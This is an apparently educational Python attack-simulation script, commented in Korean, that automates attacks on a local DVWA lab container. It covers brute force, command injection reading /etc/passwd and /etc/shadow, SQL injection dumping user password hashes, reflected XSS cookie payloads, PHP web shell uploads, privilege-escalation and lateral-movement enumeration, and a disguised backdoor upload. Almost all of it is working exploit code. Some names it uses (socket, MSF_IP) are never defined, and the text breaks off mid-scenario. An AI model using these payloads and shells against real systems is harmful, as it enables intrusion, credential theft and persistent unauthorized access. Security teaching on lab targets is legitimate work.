import requests
from bs4 import BeautifulSoup
import argparse
import time
import sys
import os

# ==================== 설정 ====================

# DVWA: standalone victim-dvwa 컨테이너로 직접 접속 (기본 포트 8080)
DVWA_URL = os.getenv("DVWA_URL", "http://127.0.0.1:8080").rstrip("/")
DVWA_LOGIN_URL = f"{DVWA_URL}/login.php"
DVWA_SECURITY_URL = f"{DVWA_URL}/security.php"

# 세션 유지를 위한 requests 객체
session = requests.Session()


# ==================== DVWA 사전 준비 ====================


def get_user_token(url):
    """DVWA의 CSRF 토큰을 추출합니다."""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        token = soup.find("input", {"name": "user_token"})
        return token["value"] if token else None
    except Exception as e:
        print(f"[!] 토큰 추출 실패 (서버가 켜져 있는지 확인하세요): {e}")
        sys.exit(1)


def setup_dvwa_session():
    """DVWA 로그인 및 보안 레벨을 Low로 설정합니다."""
    print("[*] DVWA 로그인을 시도합니다...")
    user_token = get_user_token(DVWA_LOGIN_URL)

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token,
    }

    res = session.post(DVWA_LOGIN_URL, data=login_data)
    if (
        "Welcome to Damn Vulnerable Web App" in res.text
        or "Welcome to Damn Vulnerable Web Application" in res.text
        or res.url.endswith("/index.php")
        or "security.php" in res.text
    ):
        print("[+] 로그인 성공!")
    else:
        print("[!] 로그인 실패. 자격 증명이나 서버 상태를 확인하세요.")
        sys.exit(1)

    print("[*] 보안 레벨을 'Low'로 변경합니다...")
    user_token = get_user_token(DVWA_SECURITY_URL)
    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": user_token,
    }
    session.post(DVWA_SECURITY_URL, data=security_data)
    print("[+] 보안 레벨 설정 완료.\n")


# ============================================================
# 파트 1: DVWA 타깃 공격 시나리오 (시나리오 1 ~ 5)
# ============================================================


def scenario_1_brute_force():
    """시나리오 1: 웹 로그인 폼 무차별 대입 (Brute Force)"""
    print(">>> [시나리오 1] 웹 로그인 폼 무차별 대입 (Brute Force) 시작")
    url = f"{DVWA_URL}/vulnerabilities/brute/"

    # --- 정찰 단계 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 웹 서버 포트 스캔 시뮬레이션 (Nmap -p 8080 -sV)")
    res = session.get(DVWA_URL)
    if res.status_code == 200:
        print(f"  [+] 포트 8080 열림 확인 - HTTP {res.status_code}")
    else:
        print(f"  [!] 포트 8080 응답 이상 - HTTP {res.status_code}")
    time.sleep(0.5)

    print("[*] 웹 디렉토리 브루트포싱 시뮬레이션 (Gobuster)")
    recon_paths = [
        "/login.php",
        "/setup.php",
        "/security.php",
        "/vulnerabilities/",
        "/vulnerabilities/brute/",
        "/config/",
        "/phpinfo.php",
    ]
    for path in recon_paths:
        res = session.get(f"{DVWA_URL}{path}")
        status = "발견!" if res.status_code == 200 else f"HTTP {res.status_code}"
        print(f"  [-] {path} -> {status}")
        time.sleep(0.3)

    # --- 침투 단계 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 사전 파일 기반 Brute Force 공격 시작 (Hydra 시뮬레이션)")
    passwords = ["123456", "admin1", "qwerty", "root", "111111", "admin123", "test", "password"]

    for pwd in passwords:
        params = {"username": "admin", "password": pwd, "Login": "Login"}
        res = session.get(url, params=params)
        print(f"  [-] 시도: admin / {pwd}")
        if "Welcome to the password protected area" in res.text:
            print("  [+] 공격 성공! 유효한 비밀번호 발견: password")
            break
        else:
            print("  [!] 로그인 실패")
        time.sleep(0.5)
    print("<<< 공격 완료\n")


def scenario_2_command_injection():
    """시나리오 2: 시스템 명령어 삽입 (Command Injection)"""
    print(">>> [시나리오 2] 시스템 명령어 삽입 (Command Injection) 시작")
    url = f"{DVWA_URL}/vulnerabilities/exec/"

    # --- 정찰 단계 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 입력값 검증 여부 확인 - whoami 명령어 주입 테스트")
    recon_payloads = [
        ("127.0.0.1", "정상 ping 요청"),
        ("127.0.0.1;whoami", "세미콜론(;) + whoami 주입"),
    ]
    for payload, desc in recon_payloads:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(url, data=data)
        print(f"  [-] 테스트: {desc} -> 페이로드: {payload}")
        if "www-data" in res.text or "root" in res.text:
            print("  [+] 명령어 실행 결과 확인! 취약점 존재 확인됨")
        else:
            print("  [!] 정상 응답 또는 필터링됨")
        time.sleep(0.5)

    # --- 침투 단계 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 민감 시스템 파일 탈취 시도")
    exploit_payloads = [
        ("127.0.0.1 && whoami", "권한 확인 (&&)"),
        ("127.0.0.1; uname -a", "시스템 정보 수집"),
        ("127.0.0.1; cat /etc/passwd", "/etc/passwd 탈취"),
    ]
    for payload, desc in exploit_payloads:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(url, data=data)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if "root:" in res.text or "uid=" in res.text or "daemon" in res.text or "Linux" in res.text:
            print("  [+] 명령 실행 성공! 결과 확인됨")
        else:
            print("  [!] 의도된 결과 미발견")
        time.sleep(1)
    print("<<< 공격 완료\n")


def scenario_3_sql_injection():
    """시나리오 3: 자동화된 데이터베이스 유출 (SQL Injection)"""
    print(">>> [시나리오 3] 자동화된 데이터베이스 유출 (SQL Injection) 시작")
    url = f"{DVWA_URL}/vulnerabilities/sqli/"

    # --- 정찰 단계 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 싱글 쿼테이션(') 삽입으로 SQL 에러 유발 테스트")
    recon_payloads = [
        ("1", "정상 요청"),
        ("1'", "싱글 쿼테이션 삽입 - SQL 에러 유발 시도"),
        ('1"', '더블 쿼테이션 삽입 - SQL 에러 유발 시도'),
    ]
    for payload, desc in recon_payloads:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(url, params=params)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if "You have an error in your SQL syntax" in res.text:
            print("  [+] SQL 구문 오류 발생 확인! 취약점 존재 가능성 높음")
        elif "Surname:" in res.text:
            print("  [!] 정상 데이터 반환")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(0.5)

    # --- 침투 단계 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] SQLmap 시뮬레이션 - DB 구조 매핑 및 데이터 탈취")
    exploit_payloads = [
        ("1' OR '1'='1' -- ", "항상 참인 조건으로 전체 데이터 출력"),
        ("1' AND 1=2 UNION SELECT null, version() -- ", "DB 버전 추출"),
        ("1' AND 1=2 UNION SELECT null, database() -- ", "현재 DB 이름 추출"),
        ("1' AND 1=2 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- ",
         "테이블 목록 추출"),
        ("%' AND 1=0 UNION SELECT first_name, password FROM users #", "사용자 테이블 데이터 탈취"),
    ]
    for payload, desc in exploit_payloads:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(url, params=params)
        print(f"  [-] {desc}")
        print(f"      페이로드: {payload}")
        if "Surname:" in res.text:
            print("  [+] 데이터 유출 성공!")
        elif "You have an error" in res.text:
            print("  [!] SQL 에러 발생 (페이로드 조정 필요)")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(1)
    print("<<< 공격 완료\n")


def scenario_4_file_upload():
    """시나리오 4: 웹 쉘(Web Shell) 업로드"""
    print(">>> [시나리오 4] 웹 쉘(Web Shell) 업로드 시작")
    url = f"{DVWA_URL}/vulnerabilities/upload/"

    # --- 정찰 단계 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 확장자 검증 우회 가능성 테스트")
    recon_uploads = [
        ("test.txt", "Hello, this is a test.", "text/plain", "텍스트 파일 업로드 테스트"),
        ("test.php", "<?php echo 'test successful'; ?>", "application/x-php", "무해한 PHP 스크립트 업로드 테스트"),
    ]
    for filename, content, mime, desc in recon_uploads:
        files = {"uploaded": (filename, content, mime)}
        data = {"Upload": "Upload"}
        res = session.post(url, files=files, data=data)
        print(f"  [-] {desc}: {filename}")
        if "succesfully uploaded" in res.text:
            print(f"  [+] {filename} 업로드 성공! 확장자 필터링 없음 확인")
        else:
            print(f"  [!] {filename} 업로드 실패 또는 차단됨")
        time.sleep(0.5)

    # --- 침투 단계 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 시스템 원격 제어용 웹 쉘 업로드")

    # 웹 쉘 업로드
    shell_content = '<?php system($_GET["cmd"]); ?>'
    files = {"uploaded": ("shell.php", shell_content, "application/x-php")}
    data = {"Upload": "Upload"}
    res = session.post(url, files=files, data=data)
    print(f"  [-] 웹 쉘 업로드 시도: shell.php")
    if "succesfully uploaded" in res.text:
        print("  [+] 웹 쉘 업로드 성공!")
    else:
        print("  [!] 웹 쉘 업로드 실패")

    # 업로드된 웹 쉘 실행
    time.sleep(0.5)
    commands = ["id", "whoami", "cat /etc/passwd"]
    for cmd in commands:
        run_url = f"{DVWA_URL}/hackable/uploads/shell.php?cmd={cmd}"
        res = session.get(run_url)
        print(f"  [-] 웹 쉘 명령 실행: {cmd}")
        if res.status_code == 200 and len(res.text.strip()) > 0:
            # 응답의 핵심 부분만 표시
            output_lines = res.text.strip().split("\n")[:5]
            for line in output_lines:
                stripped = line.strip()
                if stripped:
                    print(f"      > {stripped}")
            print("  [+] 명령 실행 성공!")
        else:
            print("  [!] 웹 쉘 실행 결과 확인 불가")
        time.sleep(0.5)
    print("<<< 공격 완료\n")


def scenario_5_reflected_xss():
    """시나리오 5: 악성 스크립트 반사 (Reflected XSS)"""
    print(">>> [시나리오 5] 악성 스크립트 반사 (Reflected XSS) 시작")
    url = f"{DVWA_URL}/vulnerabilities/xss_r/"

    # --- 정찰 단계 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 입력값이 HTML로 그대로 렌더링되는지 확인")
    recon_payloads = [
        ("Jiseop", "정상 이름 입력"),
        ("<u>VULN_TEST</u>", "HTML 태그(<u>) 삽입 테스트"),
        ("<b>BOLD_TEST</b>", "HTML 태그(<b>) 삽입 테스트"),
    ]
    for payload, desc in recon_payloads:
        params = {"name": payload}
        res = session.get(url, params=params)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if payload in res.text and ("<" in payload):
            print("  [+] HTML 태그가 그대로 삽입됨! XSS 취약점 존재 확인")
        else:
            print("  [!] 필터링 여부 확인 중...")
        time.sleep(0.5)

    # --- 침투 단계 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] JavaScript 삽입하여 세션 쿠키 탈취 시연")
    exploit_payloads = [
        ("<script>console.log('test')</script>", "콘솔 로그 테스트"),
        ("'><script>alert(1)</script>", "탈출 시도"),
        ("<ScRiPt>alert('bypass')</sCrIpT>", "대소문자 우회 테스트"),
        ("<script>alert(document.cookie)</script>", "쿠키 탈취 페이로드"),
    ]
    for payload, desc in exploit_payloads:
        params = {"name": payload}
        res = session.get(url, params=params)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if payload in res.text:
            print("  [+] XSS 페이로드가 필터링 없이 그대로 삽입됨!")
        else:
            print("  [!] 스크립트 실행 실패 또는 필터링됨")
        time.sleep(0.8)
    print("<<< 공격 완료\n")


# ============================================================
# 파트 2: 통합 시나리오 — DVWA 침투 → 침투 후 공격 (시나리오 6 ~ 10)
# ============================================================


def scenario_6_sqli_credential_dump():
    """시나리오 6: [통합] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투"""
    print(">>> [시나리오 6] SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투 시작")
    url = f"{DVWA_URL}/vulnerabilities/sqli/"

    # ========================================
    # 단계 1: DVWA 침투 (SQL Injection)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 1] DVWA 침투 — SQL Injection")
    print("=" * 50)

    # --- 정찰 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] SQL Injection 취약점 존재 여부 확인")
    recon_payloads = [
        ("1", "정상 요청"),
        ("1'", "싱글 쿼테이션 삽입 - SQL 에러 유발 시도"),
        ("1' OR '1'='1", "항상 참 조건 테스트"),
    ]
    for payload, desc in recon_payloads:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(url, params=params)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if "You have an error in your SQL syntax" in res.text:
            print("  [+] SQL 구문 오류 발생! 취약점 존재 확인")
        elif "Surname:" in res.text:
            print("  [+] 데이터 반환 확인")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(0.5)

    # --- 침투: DB 구조 파악 및 크리덴셜 탈취 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] DB 구조 매핑 및 사용자 크리덴셜 탈취")

    exploit_steps = [
        ("1' AND 1=2 UNION SELECT null, version() -- ", "DB 버전 추출"),
        ("1' AND 1=2 UNION SELECT null, database() -- ", "현재 DB 이름 추출"),
        ("1' AND 1=2 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- ",
         "테이블 목록 추출"),
        ("1' AND 1=2 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' -- ",
         "users 테이블 컬럼 추출"),
    ]
    for payload, desc in exploit_steps:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(url, params=params)
        print(f"  [-] {desc}")
        print(f"      페이로드: {payload}")
        if "Surname:" in res.text:
            print("  [+] 데이터 유출 성공!")
        else:
            print("  [!] 특이사항 없음")
        time.sleep(0.8)

    # 최종 크리덴셜 탈취
    print("\n[*] 사용자 크리덴셜 (ID + 패스워드 해시) 탈취")
    cred_payload = "%' AND 1=0 UNION SELECT user, password FROM users #"
    params = {"id": cred_payload, "Submit": "Submit"}
    res = session.get(url, params=params)
    print(f"  [-] 페이로드: {cred_payload}")

    stolen_creds = []
    if "Surname:" in res.text:
        print("  [+] 크리덴셜 탈취 성공!")
        soup = BeautifulSoup(res.text, "html.parser")
        results = soup.find_all("pre")
        for r in results:
            text = r.get_text()
            if "First name:" in text and "Surname:" in text:
                lines = text.strip().split("\n")
                user = ""
                pwd_hash = ""
                for line in lines:
                    if "First name:" in line:
                        user = line.split("First name:")[-1].strip()
                    if "Surname:" in line:
                        pwd_hash = line.split("Surname:")[-1].strip()
                if user and pwd_hash:
                    stolen_creds.append((user, pwd_hash))
                    print(f"      > 사용자: {user} | 해시: {pwd_hash[:20]}...")
    else:
        print("  [!] 크리덴셜 탈취 실패")
    time.sleep(1)

    # ========================================
    # 단계 2: 침투 후 공격 (Post-Exploitation)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 2] 침투 후 공격 — 크리덴셜 크래킹 및 시스템 침투")
    print("=" * 50)

    # --- 패스워드 해시 크래킹 시뮬레이션 ---
    print("\n[*] === 패스워드 해시 크래킹 (John the Ripper 시뮬레이션) ===")
    known_hashes = {
        "5f4dcc3b5aa765d61d8327deb882cf99": "password",
        "e99a18c428cb38d5f260853678922e03": "abc123",
        "8d3533d75ae2c3966d7e0d4fcc69216b": "charley",
        "0d107d09f5bbe40cade3de5c71e9e9b7": "letmein",
    }
    cracked_creds = []
    for user, pwd_hash in stolen_creds if stolen_creds else [("admin", "5f4dcc3b5aa765d61d8327deb882cf99")]:
        print(f"  [-] 크래킹 시도: {user} (해시: {pwd_hash[:20]}...)")
        time.sleep(0.5)
        cracked = known_hashes.get(pwd_hash, None)
        if cracked:
            print(f"  [+] 크래킹 성공! {user}:{cracked}")
            cracked_creds.append((user, cracked))
        else:
            print(f"  [!] 사전에서 일치하는 평문 없음 (레인보우 테이블 필요)")
        time.sleep(0.3)

    # --- 탈취한 크리덴셜로 시스템 접근 시도 ---
    print("\n[*] === 시스템 접근 시도 (SSH 브루트포스 시뮬레이션) ===")
    print("[*] 탈취한 크리덴셜로 SSH 로그인을 시도합니다.")
    target_port = 22
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((MSF_IP, target_port))
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        print(f"  [+] SSH 포트 {target_port} 열림 - 배너: {banner}")
    except Exception as e:
        print(f"  [!] SSH 포트 접속 실패: {e}")
        print("  [*] SSH 직접 연결 불가, 웹 기반 침투 후 공격으로 전환")

    for user, pwd in cracked_creds if cracked_creds else [("admin", "password")]:
        print(f"  [-] SSH 로그인 시도: {user}:{pwd}")
        time.sleep(0.5)
        print(f"  [*] (시뮬레이션) {user}:{pwd} 로 SSH 인증 시도 중...")
        time.sleep(0.3)

    # --- 시스템 정보 수집 ---
    print("\n[*] === 시스템 정보 수집 (Post-Exploitation Enumeration) ===")
    cmd_url = f"{DVWA_URL}/vulnerabilities/exec/"
    enum_commands = [
        ("127.0.0.1; whoami", "현재 사용자 확인"),
        ("127.0.0.1; id", "사용자 권한 확인"),
        ("127.0.0.1; cat /etc/hostname", "호스트명 확인"),
        ("127.0.0.1; df -h", "디스크 사용량 확인"),
        ("127.0.0.1; ls -la /home/", "홈 디렉토리 사용자 목록"),
    ]
    for payload, desc in enum_commands:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(cmd_url, data=data)
        print(f"  [-] {desc} -> {payload}")
        if res.status_code == 200:
            print("  [+] 명령 실행 성공")
        time.sleep(0.5)

    print("<<< 공격 완료\n")


def scenario_7_cmd_injection_privesc():
    """시나리오 7: [통합] Command Injection 침투 → 권한 상승 시도"""
    print(">>> [시나리오 7] Command Injection 침투 → 권한 상승 시도 시작")
    url = f"{DVWA_URL}/vulnerabilities/exec/"

    # ========================================
    # 단계 1: DVWA 침투 (Command Injection)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 1] DVWA 침투 — Command Injection")
    print("=" * 50)

    # --- 정찰 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 명령어 삽입 가능 여부 확인")
    recon_payloads = [
        ("127.0.0.1", "정상 ping 요청"),
        ("127.0.0.1; echo VULN_TEST", "세미콜론(;) + echo 주입"),
        ("127.0.0.1 | echo PIPE_TEST", "파이프(|) + echo 주입"),
    ]
    for payload, desc in recon_payloads:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(url, data=data)
        print(f"  [-] {desc} -> 페이로드: {payload}")
        if "VULN_TEST" in res.text or "PIPE_TEST" in res.text:
            print("  [+] 명령어 실행 결과 확인! 취약점 존재")
        time.sleep(0.5)

    # --- 침투: 원격 명령 실행 확보 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 원격 명령 실행 확보 및 초기 정보 수집")
    initial_cmds = [
        ("127.0.0.1; whoami", "현재 사용자 확인"),
        ("127.0.0.1; id", "사용자 ID/그룹 확인"),
        ("127.0.0.1; uname -a", "커널 및 OS 정보 수집"),
        ("127.0.0.1; cat /etc/os-release", "OS 배포판 정보"),
    ]
    for payload, desc in initial_cmds:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(url, data=data)
        print(f"  [-] {desc}")
        print(f"      페이로드: {payload}")
        if res.status_code == 200:
            print("  [+] 명령 실행 성공")
        time.sleep(0.5)

    # ========================================
    # 단계 2: 침투 후 공격 (권한 상승)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 2] 침투 후 공격 — 권한 상승 (Privilege Escalation)")
    print("=" * 50)

    # --- SUID 바이너리 탐색 ---
    print("\n[*] === SUID 바이너리 탐색 ===")
    print("[*] SetUID 비트가 설정된 실행 파일을 검색합니다.")
    suid_payload = "127.0.0.1; find / -perm -u=s -type f 2>/dev/null | head -20"
    data = {"ip": suid_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] SUID 바이너리 검색: {suid_payload}")
    if res.status_code == 200:
        print("  [+] SUID 바이너리 목록 수집 완료")
        # 결과에서 주요 SUID 바이너리 표시
        soup = BeautifulSoup(res.text, "html.parser")
        pre = soup.find("pre")
        if pre:
            lines = pre.get_text().strip().split("\n")
            suid_targets = [l.strip() for l in lines if l.strip() and "/" in l and "ping" not in l]
            for binary in suid_targets[:10]:
                if binary and not binary.startswith("PING"):
                    print(f"      > {binary}")
    time.sleep(0.8)

    # --- sudo 권한 확인 ---
    print("\n[*] === sudo 권한 확인 ===")
    sudo_payload = "127.0.0.1; sudo -l 2>&1 | head -10"
    data = {"ip": sudo_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] sudo 권한 조회: {sudo_payload}")
    if "root" in res.text or "ALL" in res.text:
        print("  [+] sudo 권한 발견! 권한 상승 가능!")
    else:
        print("  [!] sudo 권한 제한됨")
    time.sleep(0.5)

    # --- 크론탭 확인 ---
    print("\n[*] === 크론잡 확인 (Cron Job Enumeration) ===")
    cron_payload = "127.0.0.1; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null"
    data = {"ip": cron_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] 크론잡 조회: 시스템 예약 작업 확인")
    if res.status_code == 200:
        print("  [+] 크론잡 정보 수집 완료")
    time.sleep(0.5)

    # --- 쓰기 가능한 디렉토리 탐색 ---
    print("\n[*] === 쓰기 가능한 디렉토리 탐색 ===")
    writable_payload = "127.0.0.1; find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null"
    data = {"ip": writable_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] 쓰기 가능 디렉토리 검색")
    if res.status_code == 200:
        print("  [+] 쓰기 가능 경로 발견")
    time.sleep(0.5)

    # --- 커널 취약점 확인 ---
    print("\n[*] === 커널 취약점 확인 (Kernel Exploit Check) ===")
    kernel_payload = "127.0.0.1; uname -r"
    data = {"ip": kernel_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] 커널 버전 확인")
    if res.status_code == 200:
        print("  [+] 커널 버전 수집 완료 — exploit-db 조회 가능")
    time.sleep(0.5)

    # --- /etc/shadow 접근 시도 ---
    print("\n[*] === 민감 파일 접근 시도 ===")
    shadow_payload = "127.0.0.1; cat /etc/shadow 2>&1 | head -5"
    data = {"ip": shadow_payload, "Submit": "Submit"}
    res = session.post(url, data=data)
    print(f"  [-] /etc/shadow 읽기 시도")
    if "root:" in res.text:
        print("  [+] /etc/shadow 읽기 성공! 패스워드 해시 탈취 가능!")
    else:
        print("  [!] 권한 부족 — /etc/shadow 접근 불가")

    print("<<< 공격 완료\n")


def scenario_8_file_upload_lateral_movement():
    """시나리오 8: [통합] File Upload 침투 → 내부 정찰 및 횡적 이동"""
    print(">>> [시나리오 8] File Upload 침투 → 내부 정찰 및 횡적 이동 시작")
    upload_url = f"{DVWA_URL}/vulnerabilities/upload/"

    # ========================================
    # 단계 1: DVWA 침투 (File Upload → 웹 쉘)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 1] DVWA 침투 — 악성 웹 쉘 업로드")
    print("=" * 50)

    # --- 정찰 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 업로드 기능 및 확장자 필터링 확인")
    test_uploads = [
        ("probe.txt", "probe text", "text/plain", "텍스트 파일 업로드 테스트"),
        ("probe.php", "<?php echo 'probe'; ?>", "application/x-php", "PHP 확장자 허용 여부 테스트"),
    ]
    for filename, content, mime, desc in test_uploads:
        files = {"uploaded": (filename, content, mime)}
        data = {"Upload": "Upload"}
        res = session.post(upload_url, files=files, data=data)
        print(f"  [-] {desc}: {filename}")
        if "succesfully uploaded" in res.text:
            print(f"  [+] {filename} 업로드 성공! 필터링 없음")
        else:
            print(f"  [!] {filename} 업로드 차단됨")
        time.sleep(0.5)

    # --- 침투: 웹 쉘 업로드 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 고급 웹 쉘 업로드")
    shell_content = '<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";}?>'
    files = {"uploaded": ("recon_shell.php", shell_content, "application/x-php")}
    data = {"Upload": "Upload"}
    res = session.post(upload_url, files=files, data=data)
    shell_url = f"{DVWA_URL}/hackable/uploads/recon_shell.php"

    if "succesfully uploaded" in res.text:
        print("  [+] 웹 쉘(recon_shell.php) 업로드 성공!")
    else:
        print("  [!] 웹 쉘 업로드 실패")
        print("<<< 공격 중단\n")
        return

    # 웹 쉘 동작 확인
    time.sleep(0.5)
    verify_res = session.get(f"{shell_url}?cmd=echo+SHELL_OK")
    if "SHELL_OK" in verify_res.text:
        print("  [+] 웹 쉘 실행 확인 완료!")
    else:
        print("  [!] 웹 쉘 실행 실패")
        print("<<< 공격 중단\n")
        return

    # ========================================
    # 단계 2: 침투 후 공격 (내부 정찰 → 횡적 이동)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 2] 침투 후 공격 — 내부 정찰 및 횡적 이동")
    print("=" * 50)

    def exec_shell_cmd(cmd, desc):
        """웹 쉘을 통해 명령 실행 후 결과를 출력합니다."""
        import urllib.parse
        encoded_cmd = urllib.parse.quote(cmd)
        res = session.get(f"{shell_url}?cmd={encoded_cmd}")
        print(f"  [-] {desc}: {cmd}")
        if res.status_code == 200 and "<pre>" in res.text:
            soup = BeautifulSoup(res.text, "html.parser")
            pre = soup.find("pre")
            if pre:
                output = pre.get_text().strip()
                if output:
                    for line in output.split("\n")[:8]:
                        print(f"      > {line.strip()}")
                    print("  [+] 실행 성공")
                    return output
        print("  [!] 결과 없음 또는 실행 실패")
        return ""

    # --- 시스템 기본 정보 수집 ---
    print("\n[*] === 시스템 기본 정보 수집 ===")
    exec_shell_cmd("whoami", "현재 사용자")
    time.sleep(0.3)
    exec_shell_cmd("hostname", "호스트명")
    time.sleep(0.3)
    exec_shell_cmd("cat /etc/os-release | head -5", "OS 버전")
    time.sleep(0.3)

    # --- 내부 네트워크 정찰 ---
    print("\n[*] === 내부 네트워크 정찰 (Network Enumeration) ===")
    exec_shell_cmd("ifconfig 2>/dev/null || ip addr show", "네트워크 인터페이스 확인")
    time.sleep(0.5)
    exec_shell_cmd("cat /etc/hosts", "hosts 파일 확인 (내부 서비스 발견)")
    time.sleep(0.5)
    exec_shell_cmd("netstat -tlnp 2>/dev/null || ss -tlnp", "리스닝 포트 확인")
    time.sleep(0.5)
    exec_shell_cmd("arp -a 2>/dev/null || cat /proc/net/arp", "ARP 테이블 (인접 호스트 발견)")
    time.sleep(0.5)

    # --- 횡적 이동 시도 ---
    print("\n[*] === 횡적 이동 시도 (Lateral Movement) ===")
    print("[*] 내부 네트워크에서 다른 서비스/호스트 탐색")
    exec_shell_cmd("ping -c 1 -W 1 127.0.0.1 2>&1 | head -3", "로컬 호스트 ping 테스트")
    time.sleep(0.5)
    # 내부에서 다른 포트 스캔
    print("[*] 내부 포트 스캔 시뮬레이션")
    internal_scan_ports = [21, 22, 80, 3306, 5432, 8080]
    for port in internal_scan_ports:
        exec_shell_cmd(
            f"timeout 2 bash -c 'echo > /dev/tcp/localhost/{port}' 2>&1 && echo 'OPEN' || echo 'CLOSED'",
            f"로컬 포트 {port} 스캔"
        )
        time.sleep(0.3)

    # --- DB 접근 시도 ---
    print("\n[*] === 데이터베이스 직접 접근 시도 ===")
    exec_shell_cmd("cat /var/www/html/config/config.inc.php 2>/dev/null | grep -i 'db_'",
                   "DVWA DB 설정 파일에서 크리덴셜 추출")
    time.sleep(0.5)

    print("<<< 공격 완료\n")


def scenario_9_bruteforce_persistence():
    """시나리오 9: [통합] Brute Force 침투 → 백도어 설치 및 지속성 확보"""
    print(">>> [시나리오 9] Brute Force 침투 → 백도어 설치 및 지속성 확보 시작")
    brute_url = f"{DVWA_URL}/vulnerabilities/brute/"

    # ========================================
    # 단계 1: DVWA 침투 (Brute Force)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 1] DVWA 침투 — 웹 로그인 Brute Force")
    print("=" * 50)

    # --- 정찰 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] 로그인 폼 구조 분석 및 방어 메커니즘 확인")
    res = session.get(brute_url)
    soup = BeautifulSoup(res.text, "html.parser")
    form = soup.find("form")
    if form:
        inputs = form.find_all("input")
        print(f"  [+] 로그인 폼 발견 — 입력 필드 {len(inputs)}개")
        for inp in inputs:
            print(f"      > name: {inp.get('name', 'N/A')}, type: {inp.get('type', 'N/A')}")
    else:
        print("  [!] 로그인 폼 미발견")
    print("  [*] CAPTCHA 또는 계정 잠금 메커니즘 없음 확인 (Low 보안)")
    time.sleep(0.5)

    # --- 침투: Brute Force ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 사전 공격(Dictionary Attack) 실행")
    passwords = [
        "123456", "admin", "qwerty", "letmein", "monkey",
        "master", "dragon", "1234", "password"
    ]
    valid_password = None
    for pwd in passwords:
        params = {"username": "admin", "password": pwd, "Login": "Login"}
        res = session.get(brute_url, params=params)
        print(f"  [-] 시도: admin / {pwd}")
        if "Welcome to the password protected area" in res.text:
            print(f"  [+] 로그인 성공! 패스워드: {pwd}")
            valid_password = pwd
            break
        else:
            print("  [!] 실패")
        time.sleep(0.4)

    if not valid_password:
        print("  [!] Brute Force 실패 — 유효한 패스워드 미발견")
        print("<<< 공격 중단\n")
        return

    # ========================================
    # 단계 2: 침투 후 공격 (백도어 설치 및 지속성)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 2] 침투 후 공격 — 백도어 설치 및 지속성 확보")
    print("=" * 50)

    # --- File Upload를 이용한 백도어 설치 ---
    print("\n[*] === 백도어 웹 쉘 설치 (Persistence) ===")
    print("[*] 관리자 권한으로 파일 업로드 기능에 접근하여 백도어 설치")
    upload_url = f"{DVWA_URL}/vulnerabilities/upload/"

    # 은닉된 백도어 업로드 (일반 파일명으로 위장)
    backdoor_content = '<?php if(isset($_GET["q"])){echo "<pre>".shell_exec($_GET["q"])."</pre>";}?>'
    files = {"uploaded": (".htaccess.php", backdoor_content, "application/x-php")}
